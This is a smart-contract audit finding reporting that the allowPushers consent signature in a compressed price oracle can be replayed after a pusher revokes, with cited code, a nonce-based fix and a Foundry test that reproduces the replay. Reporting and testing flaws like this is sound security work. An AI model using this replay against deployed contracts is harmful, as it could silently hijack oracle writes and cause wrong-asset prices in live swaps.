### Title
`allowPushers` Consent Signature Has No Replay Guard — Creator Can Re-Establish Delegation After Pusher Revokes - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary

`allowPushers` in `CompressedOracleV1` accepts a pusher's EIP-191 consent signature that commits to `(chainid, oracle, deadline, pusher, creator)`. There is no nonce and no used-signature bitmap. After a pusher calls `revokePusher()` to clear `namespaceRemapping[pusher]`, the creator can immediately replay the original `allowPushers` call with the identical signature and deadline (while the deadline is still in the future) to silently re-establish the delegation. The pusher's revocation is therefore not final.

### Finding Description

`allowPushers` verifies the pusher's consent signature and writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

`_ensureDeadline` only checks `block.timestamp <= deadline` — there is no nonce, no per-signature consumed flag, and no per-pusher revocation counter:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

`revokePusher` clears the mapping to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

Because the signed message contains no nonce or revocation counter, the creator can call `allowPushers` again with the exact same `(deadline, pusher, signature)` tuple — as long as `block.timestamp <= deadline` — and the mapping is restored to `creator`. The pusher's explicit revocation is silently undone.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

After the replay, every subsequent push from the pusher lands in the creator's namespace, not the pusher's own. The pusher has no on-chain signal that the delegation was re-established.

The documentation acknowledges the deadline is required precisely to prevent this class of attack ("an undated signature could re-establish a delegation AFTER the pusher revoked it"), but the deadline only prevents re-use *after* it expires — it does not prevent re-use *before* it expires, which is the window the replay exploits. [5](#0-4) 

### Impact Explanation

After the replay, the pusher's `fallback` pushes are silently routed into the creator's namespace. If the pusher has revoked because they are now pushing prices for a different asset pair in their own namespace, those prices land in the creator's namespace instead. The `AnchoredPriceProvider` reads from the creator's namespace via `offchainOracle.price(feedId, pool)`:

```solidity
(mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
``` [6](#0-5) 

A creator's pool configured for Asset X/Y would then consume prices for Asset Z/W, producing an unclamped or wrong-asset bid/ask that reaches a live swap. Even in the case where the pusher is pushing the same asset, the creator maintains unauthorized oracle write access that the pusher explicitly withdrew, violating the oracle's access-control invariant and enabling the creator to sustain a price feed the pusher intended to terminate.

### Likelihood Explanation

The attack requires only that the creator retain the original `allowPushers` calldata (trivially available from transaction history) and that the deadline has not yet expired. Deadlines are typically set days in the future. The creator is a semi-trusted actor with a direct financial incentive to keep a price feed alive. No special privilege, no malicious token, and no off-chain coordination is needed.

### Recommendation

Track consumed consent signatures with a per-pusher revocation nonce or a `usedSignatures` bitmap. The simplest fix is to add a `uint256 public pusherNonce` per pusher (or a global `mapping(address => uint256) public pusherNonce`) and include it in the signed digest:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusherNonce[pusher], pusher, msg.sender))
```

Increment `pusherNonce[pusher]` inside `revokePusher` and `removePushers`. This makes every previously issued consent signature immediately invalid after revocation, regardless of the deadline.

### Proof of Concept

```solidity
function testRevokedDelegationReplayable() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent and creator establishes delegation.
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);
    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

    // 2. Pusher revokes.
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

    // 3. Creator replays the SAME signature — deadline still valid.
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // no revert
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegation silently re-established");

    // 4. Pusher's next push lands in creator's namespace, not their own.
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(9_999_999, 8, 8); // attacker-chosen price
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Creator's namespace received the push; pusher's own namespace is empty.
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
        U64x32.decode(uint32(raw >> 16)),
        "creator namespace updated without pusher consent"
    );
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0, "pusher own ns empty");
}
``` [7](#0-6) [3](#0-2) [2](#0-1)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L280-280)
```text
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
```
